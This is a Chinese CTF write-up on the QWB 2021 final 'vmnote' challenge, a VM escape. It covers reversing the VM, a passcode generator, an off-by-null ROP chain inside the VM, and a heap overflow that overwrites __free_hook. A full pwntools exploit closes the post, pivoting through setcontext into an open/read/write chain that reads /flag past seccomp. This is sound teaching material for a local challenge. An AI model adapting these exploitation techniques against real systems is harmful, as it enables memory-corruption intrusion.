---
title: Virtual Machine Escaping:VM note
date: 2021-07-15 14:53:19
tags: 
---
qwb vm note
<!--more-->
# 0x0 prologue

上周和文萱还有远程队友师傅们参加了qwb final，0输出摸鱼选手，一题vmnote做两天，我至今疑惑为啥1血那么快就出来了，第2天早上我们才逆完虚拟机的asm，这大概就是差距吧orz。这是我做的第一题vmpwn，感觉挺有趣的，除了hardworking的部分以外。

那天下午一直以为洞在vm操作里，我看了34个小时感觉vm写的很安全，后来看`heap`操作的时候感觉有点小瑕疵之外还是很安全的（这个小瑕疵没有直接利用的可能），唯独没看`readint`操作。没想到这弄没大眼的家伙居然藏了个`offbynull`。最后2.5小时开始写`exp`，但是一不小心`mv /lib/x86_64-linux-gnu/libc-2.31.so .` 直接把`docker`弄挂了，重写最后都控制执行流了但是一直卡在一个read坑里，最后时间跑完了也没搞出来。

总之题目是挺有意思的，虽然很多我没实力体验，下次有机会再来。

（完整的逆向内容我就不贴了想体验这题的建议从逆向开始<3）

# 0x1 Prepare
> attachment: https://github.com/n132/attachment/tree/main/QWB_2021_Final/vmnote
> update 07/20/2021 vmnote decompiler: https://github.com/P4nda0s/qwb_vmnote_recompiler

这题有个`note.bin`的文件，`binary`实现了一个虚拟机，`note.bin`是一个程序可以放在虚拟机里面跑，直接运行的话有个密码。

`binary`的虚拟机逆向还是比较轻松的，一共10几个操作逆向完就行；一开始需要逆向，还有就是我们当时经验缺乏的一个点，逆向可以先着重找`password`部分`patch`掉，让负责pwn的师傅可以先跑起来熟悉熟悉，无逻辑找找洞。

之后就需要逆向虚拟机的`binary`，这个部分我们是由枥锐师傅写了一个解释器，将虚拟机`binary`解释成类似于汇编语言的形式：

```bash
0x145--------:  push rbp
0x147--------:  mov rbp, rsp
	0x14a--------:  mov r0, 0x1132
	0x154--------:  call write
	0x159--------:  call readint  # ReadInt
...
```

之后我们再一段段人脑f5，标注每个函数的意思：

```bash
0x0 - 0x22    == main
0x23 - 0x3c   == initRandSeed
0x3d - 0x4c   == exit(0) 
0x4d -0x5c    == getTime
0x5c -0x6a    == srand
0x6b - 0x76   == rand
0x77 - 0x85   == create(arg)
...
```

之后就可以开始pwn了，在我pwn的时候晴宇师傅搞出来`passwd`：

```bash
from pwn import *
context.log_level = 'debug'

p = process("./vmnote")

def gen_passcode(onetimeCode):
    hash_table = [218, 179, 148, 171, 119, 96, 184, 110, 192, 93, 154, 165, 95, 46, 76, 181, 98, 239, 185, 231, 168, 72, 195, 60, 22, 67, 31, 8, 219, 230, 217, 201, 56, 92, 2, 61, 125, 251, 3, 246, 176, 190, 134, 216, 19, 48, 89, 229, 208, 147, 145, 9, 194, 81, 4, 177, 65, 213, 113, 236, 32, 7, 250, 207, 85, 204, 146, 133, 127, 200, 49, 94, 223, 33, 163, 245, 55, 71, 186, 120, 254, 174, 62, 43, 37, 25, 151, 64, 252, 78, 132, 167, 225, 241, 140, 88, 143, 144, 161, 211, 215, 122, 45, 13, 100, 14, 53, 105, 189, 221, 224, 166, 235, 155, 234, 87, 206, 35, 30, 121, 40, 170, 75, 6, 103, 227, 18, 77, 175, 51, 114, 44, 193, 111, 34, 118, 52, 238, 137, 242, 198, 188, 214, 17, 63, 86, 187, 58, 139, 74, 138, 160, 106, 83, 99, 90, 12, 0, 180, 249, 47, 20, 36, 158, 244, 253, 247, 199, 101, 23, 240, 159, 112, 131, 202, 79, 26, 243, 237, 107, 42, 115, 172, 29, 226, 228, 205, 70, 16, 5, 178, 38, 173, 109, 233, 108, 66, 182, 27, 197, 222, 130, 80, 11, 126, 73, 57, 150, 50, 59, 91, 1, 164, 196, 104, 41, 24, 84, 68, 97, 183, 136, 232, 149, 209, 21, 248, 162, 129, 169, 142, 255, 128, 28, 141, 152, 135, 210, 39, 123, 220, 156, 117, 54, 212, 203, 10, 102, 69, 82, 116, 191, 124, 157, 15, 153]
    result = [208, 147, 215, 88, 4, 35, 177, 88, 30, 147, 213, 208, 234, 208, 35, 81, 88]

    ans = ""
    for x in result:
        ans += chr(hash_table.index(x))
    result = ""
    result_num = int(onetimeCode) + 0x12345678
    result = str(result_num).rjust(8, '0')
    return ans + result

p.recvuntil("challenge ")
onetime = p.recvuntil("\n", drop=True)
p.sendlineafter("passcode: ", gen_passcode(onetime))
p.interactive()
```

# 0x2 ROP

这题的pwn部分逻辑比较简单，在虚拟机里面实现了3个操作，`creat`，`show`，`delete`。

`show`操作和`delete`没有毛病，`creat`我发现存在一点小问题，其中的写内容的部分存在32bit截断的问题另外大小比较用的是有符号的，但是不能直接利用，因为没有`edit`常见地这个洞是在`edit`里`resize`的时候用起来的。

可以直接利用的漏洞点在`readInt`，这个我当时是`fuzz`出来的，一般认为这种地方放洞的概率太低了可能检查的师傅就略过去了。。写满`0x60`可以做一个`offbyone`，因为虚拟机没有canary啥的，这样就可以覆盖`rbp`低位，之后就可以`rop`做一个`read`来加长`rop chain`，因为不太稳定建议调试的时候把`random`给`patch`掉，关掉`aslr`；最后打的时候做一个`slide`。

可以rop之后就会发现一个问题，我们做的是虚拟机rop，想要逃逸还要影响外面。我就反复看了虚拟机指令好长时间都没找到问题，这是值得反思的第二个点，反应确实愚钝了，既然放了heap操作，这些读写不都是heap段的吗，可以通过heap操作来exploit。

# 0x3 Escape

这时候就需要确定一下咱们的操作，我们在虚拟机程序上有add read delete show，后面三者一定要通过add“注册”的地址看似听安全但是别忘了我们还有前文提到的size截断/类型漏洞。我们可以用截断也可以用类型来绕过`size`大小检查，`0x80000001`和`0x100000001`都可以绕过。这样我们就有了`heap overflow`，之后就可以`arbitrary address write`了，通过rop我们可以写掉`_free_hook`，这样就可以到最后一关，`seccomp`。

虽然我感觉这个加上去没啥必要，但是这题从逆向就预示了：`it‘s a hardworking one.`

# 0x4 trap&final pwnch

比赛的时候我就在终点前卡住了，因为我一直搞不懂为啥我`read(0,heap,0x80000001)`可以读进去，但是`read(0,__free_hook,0x80000001)`就会失败，因为我准备的`cheatsheet`里是直接改`__free_hook`的，之后慌乱之中把我的`docker`搞崩了直接宣告我的失败。

比赛结束后我研究了下是因为`__free_hook`的地址+`0x80000001`不能通过`sys_read`的`access_ok`检查，简单来说就是`addr+size`不能`wrap`且必须在`task_size`内，这个`task_size`定义太多就没看，手动测了一下应该是`stack`的末尾。

```bash
static inline int __access_ok(unsigned long addr, unsigned long size)
{
	return __addr_range_nowrap(addr, size) &&
		(__under_task_size(addr, size) ||
		__access_ok_vsyscall(addr, size) ||
		uaccess_kernel());
}
```

这样其实我只要改一下`payload`就行，在`__free_hook`填`gadget`，在`heap`上布置`payload`来`setcontext` 之后`call`一个`rop` 做 `orw`。

# 0x5 Exp

就放个调试版的`exp`，最后远端打还需要调一下（其实是我太懒）

```python
from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(idx,size,c=p64(0xdeadbeef)):
	cmd(1)
	p.sendlineafter(": ",str(idx))
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
def free(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def show(idx):
	cmd(2)
	p.sendlineafter(": ",str(idx))
context.arch='amd64'
context.log_level='debug'
context.terminal=['tmux','split','-h']
p=process("./pwn")#,env={'LD_PRELOAD':'./libc-2.31.so'})
add(0,0x18,"A")
show(0)
p.readuntil("content: ")
base=u64(p.readline()[:-1]+b'\0\0')-(0x7ffff7fbab41-0x7ffff7dcf000)
log.warning(hex(base))
libc=ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
libc.address=base
add(1,0x18,"B")
free(1)
free(0)
add(0,0x18,"A")
show(0)
p.readuntil("content: ")
heap=u64(p.readline()[:-1]+b'\0\0')-0x441
log.warning(hex(heap))
cmd(1)
pp=0x6ca
pay=p64(0x1d7)+p64(0x6ca)+p64(0x1f00)+p64(0xff)+p64(0x5ef)+p64(0xdeadbeef)*7
gdb.attach(p,'''b *0x55555555639a''')#0x21a2

p.sendafter(": ",pay.ljust(0x60,b"A"))
# OFFBYNULL ROP to READ

pay =b'\xee'*0x30+p64(0x6ca)+p64(heap+0x4a0)+p64(0x80000001)+p64(0xa4)#read to overflow
pay+=p64(0x6ca)+p64(0x60)+p64(0xbad)+p64(0x77)#add to pad
pay+=p64(0x6ca)+p64(0x18)+p64(0xbad)+p64(0x77)#add the one which point to free hook
pay+=p64(0x6ca)+p64(0x1eeb28+base)+p64(0x9)+p64(0xa4)#read(0,free_hook,9)
pay+=p64(0x6ca)+p64(heap+0x4a0)+p64(0x80000001)+p64(0xa4)#read our payload ropchain
pay+=p64(0x6ca)+p64(heap+0x4a0)+p64(0xbad)+p64(0x86)#free aim

p.sendline(pay)# ROP chain
#raw_input()
# hijack fd point of tcache head 
p.sendline(p64(0x21)*8+p64(0x1eeb28+base)+p64(0)*2+p64(0x20b11)+p64(0x1)*0x10)
raw_input()
# hijack free_hook
magic=0x7ffff7f237a0-0x00007ffff7dcf000+base
p.sendline(p64(magic))
raw_input()
chunk=heap+0x4a0
rop = ROP(libc)
sys = p64(0x66229+base)
rsp=chunk
rdi=0
rsi=rsp
rdx=0x120
rbp=rsi-8
rcx=sys
payload=p64(0)+p64(chunk)+b'\0'*0x10+p64(0x7ffff7e2d0dd-0x7ffff7dd5000+base)
payload=payload.ljust(0x40,b'\0')+flat([heap+0x4a0])

payload=payload.ljust(0x68,b'\0')+flat([rdi,rsi,rbp,0,rdx,0,0,rsp,rcx])
p.sendline(payload)

rax = rop.find_gadget(['pop rax','ret'])[0]
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = 0x00000000001626d6+base

rop.read(3,chunk+0x110,0x100)
rop.write(1,chunk+0x110,0x100)
rop.dump()
pyaload_rw =rop.chain()

pyaload_open =flat([rax,0x2,rdi,chunk+0xf8,rsi,0,rdx,0,0,sys])
pay = pyaload_open+pyaload_rw
p.send(pay.ljust(0xf8,b'\0')+b'/flag\0')
p.interactive()
```

# Epilogue

这题总的来说还是很好的虽然最后的seccomp有点多余；exploit很有趣一步步扩大利用；逃逸部分让我这个新手感觉很刺激有种逃离world-vm的感觉，有点遗憾最后差了一步比赛的时候没有做出来有点对不起同队的师傅们，这次比赛很多题没机会体验。

打完比赛回来最大的感受是师傅们太强了，我知道的内容相比师傅们的只是宇宙中的一颗尘埃，我想搞v8，搞chromium，搞kernel，搞qemu逃逸！立个flag，明年这时候没搞，我__n_。